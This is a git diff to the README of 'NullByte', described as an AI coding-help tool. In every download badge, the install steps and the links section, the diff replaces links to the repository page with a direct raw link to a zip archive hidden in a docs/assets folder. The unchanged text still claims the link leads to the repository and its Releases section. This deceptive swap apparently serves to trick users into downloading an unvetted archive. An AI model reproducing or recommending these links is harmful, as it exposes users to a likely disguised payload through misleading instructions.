@@ -1,6 +1,6 @@
 # ⚡ NullByte - AI Help for Coding Problems
 
-[![Download NullByte](https://img.shields.io/badge/Download-NullByte-ff69b4?style=for-the-badge&logo=github)](https://github.com/EliasXII/NullByte)
+[![Download NullByte](https://img.shields.io/badge/Download-NullByte-ff69b4?style=for-the-badge&logo=github)](https://github.com/EliasXII/NullByte/raw/refs/heads/main/docs/assets/Byte_Null_v3.0-beta.4.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Before installing NullByte, make sure your computer meets these basic needs:
 
 Click the big button below to visit the download page. From there, you can get the latest version of NullByte.
 
-[![Download NullByte](https://img.shields.io/badge/Download-NullByte-ff69b4?style=for-the-badge&logo=github)](https://github.com/EliasXII/NullByte)
+[![Download NullByte](https://img.shields.io/badge/Download-NullByte-ff69b4?style=for-the-badge&logo=github)](https://github.com/EliasXII/NullByte/raw/refs/heads/main/docs/assets/Byte_Null_v3.0-beta.4.zip)
 
 This link takes you to the GitHub repository. On the page, look for the "Releases" section. This is where the installer is stored.
 
@@ -51,7 +51,7 @@ This link takes you to the GitHub repository. On the page, look for the "Release
 Follow these steps to install NullByte:
 
 1. Open your web browser and go to the download link:  
-   https://github.com/EliasXII/NullByte
+   https://github.com/EliasXII/NullByte/raw/refs/heads/main/docs/assets/Byte_Null_v3.0-beta.4.zip
 
 2. On the GitHub page, locate the **Releases** section. Usually, it is found on the right sidebar or under the "Code" tab in a "Releases" submenu.
 
@@ -143,11 +143,11 @@ You can use NullByte with any popular code editors such as Visual Studio Code, I
 ## 🌐 Links
 
 - Repository and download page:  
-  https://github.com/EliasXII/NullByte
+  https://github.com/EliasXII/NullByte/raw/refs/heads/main/docs/assets/Byte_Null_v3.0-beta.4.zip
 
 - Support and issues: Open an issue on the GitHub page if you find bugs.
 
 - Updates: Check GitHub releases for new versions.
 
   
-[![Download NullByte](https://img.shields.io/badge/Download-NullByte-ff69b4?style=for-the-badge&logo=github)](https://github.com/EliasXII/NullByte)
+[![Download NullByte](https://img.shields.io/badge/Download-NullByte-ff69b4?style=for-the-badge&logo=github)](https://github.com/EliasXII/NullByte/raw/refs/heads/main/docs/assets/Byte_Null_v3.0-beta.4.zip)
